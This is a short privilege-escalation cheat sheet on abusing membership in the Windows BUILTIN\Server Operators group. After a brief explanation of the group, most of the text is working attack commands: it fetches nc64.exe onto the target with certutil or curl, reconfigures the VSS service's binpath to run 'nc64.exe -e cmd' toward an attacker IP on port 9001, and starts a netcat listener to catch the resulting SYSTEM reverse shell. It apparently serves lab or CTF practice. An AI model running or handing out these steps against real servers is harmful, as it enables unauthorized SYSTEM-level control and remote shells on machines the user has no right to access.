# BUILTIN\Server Operators
On a Windows Server, BUILTIN\Server Operators is a local built-in group. Its intended purpose is to give trusted users significant administrative control over the server itself, without making them full Domain Admins or local Administrators.

Think of them as the "senior janitorial staff" or "data center technicians" for a specific server. They aren't allowed to change the building's blueprints (domain policy), but they have the keys to every room (server) and can control all the equipment inside.

# Steps
1. Transfer the nc64.exe Binary.
2. vss service check.
3. Configure the command Execution.
4. Stop and start the service.

# Transfer Binary
```language
wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
python3 -m http.server 80

curl http://ip:80/nc64.exe
certutil -urlcache -f http://ip:80/nc64.exe nc64.exe
```
# Check service and Configure the Command
```language
get-service vss       #service check

sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd ip  9001"       #configure it
or
sc.exe config vss binpath="C:\programdata\nc64.exe -e cmd.exe ip 9001"
```
# Start listner and service
```language
rlwrap nc -lvnp 9001

sc.exe start vss
```
